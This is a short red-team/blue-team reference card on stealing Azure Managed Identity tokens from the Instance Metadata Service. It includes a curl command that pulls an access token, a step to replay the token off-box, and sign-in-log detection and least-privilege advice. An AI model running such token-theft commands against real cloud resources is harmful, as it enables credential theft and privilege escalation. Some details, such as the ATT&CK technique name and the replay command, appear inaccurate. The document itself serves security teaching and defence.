# [CA-TOKEN-007]: Managed Identity Token Theft

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-007 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Authentication Certificates (T1528)](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure (VM/Functions) |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Azure Resources (VMs, Automation Accounts) use the Instance Metadata Service (IMDS) at `169.254.169.254` to obtain Access Tokens for their assigned Managed Identity. If an attacker has code execution on the resource (via RCE or SSRF), they can query IMDS to get a token and export it to an external machine.
- **Attack Surface:** IMDS Endpoint.
- **Business Impact:** **Privilege Escalation**. Using the identity's permissions (e.g., Contributor) from an attacker-controlled machine.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** RCE / SSRF on Azure Resource.
- **Tools:** `curl`, `Invoke-RestMethod`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Request Token**
```bash
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```

**Step 2: Exfiltrate & Replay**
Copy the `access_token` and use it externally.
```bash
az login --service-principal -u <ClientID> -p <AccessToken> --tenant <TenantID>
```
*Note: Managed Identity tokens are not bound to the source IP (yet).*

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **SignInLogs** | `ManagedIdentity` | Sign-in where IP Address is **Public** (Managed Identities usually authenticate from internal Azure IPs). |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Permissions:** Follow Least Privilege for Managed Identities.
*   **Service Tags:** Currently, you cannot restrict Managed Identity tokens to specific IPs easily. Monitoring is key.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-003]
> **Next Logical Step:** [LAT-CLOUD-001]
